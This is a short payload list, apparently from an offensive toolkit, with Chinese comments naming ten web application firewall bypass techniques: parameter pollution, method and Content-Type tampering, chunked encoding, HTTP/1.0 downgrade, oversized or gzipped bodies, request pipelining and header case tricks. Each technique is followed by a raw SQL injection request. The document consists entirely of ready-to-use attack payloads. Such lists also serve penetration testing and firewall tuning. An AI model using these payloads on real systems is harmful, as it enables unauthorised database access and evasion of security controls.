# WAF 通用绕过 - HTTP 参数污染 (HPP) 多次传参
id=1&id=1 UNION SELECT 1,2,3--
# WAF 通用绕过 - HTTP 方法篡改 (GET 改 POST 绕过 URL 检测)
POST /endpoint?id=1' OR '1'='1
# WAF 通用绕过 - Content-Type 篡改为 multipart/form-data
Content-Type: multipart/form-data; boundary=x   Body: --x\r\nContent-Disposition: form-data; name="id"\r\n\r\n1' OR '1'='1\r\n--x--
# WAF 通用绕过 - Content-Type 篡改为 application/json
Content-Type: application/json   Body: {"id":"1' OR '1'='1"}
# WAF 通用绕过 - Chunked Transfer-Encoding 分块混淆
Transfer-Encoding: chunked\r\n\r\n5\r\n1' OR \r\n6\r\n'1'='1\r\n0\r\n\r\n
# WAF 通用绕过 - HTTP/1.0 降级绕过高级检测
GET /endpoint?id=1' OR '1'='1 HTTP/1.0
# WAF 通用绕过 - 超大请求体绕过检测深度限制 (10000 填充字节)
 1' UNION SELECT 1,2,3--
# WAF 通用绕过 - 请求体压缩绕过 (gzip)
Content-Encoding: gzip 1' UNION SELECT 1,2,3--
# WAF 通用绕过 - Pipeline 请求走私绕过
GET /endpoint?id=1 HTTP/1.1\r\nHost: target\r\n\r\nGET /endpoint?id=1' OR '1'='1 HTTP/1.1\r\nHost: target\r\n\r\n
# WAF 通用绕过 - 请求头大小写混淆
Content-TYPE: application/x-www-form-urlencoded id=1' OR '1'='1
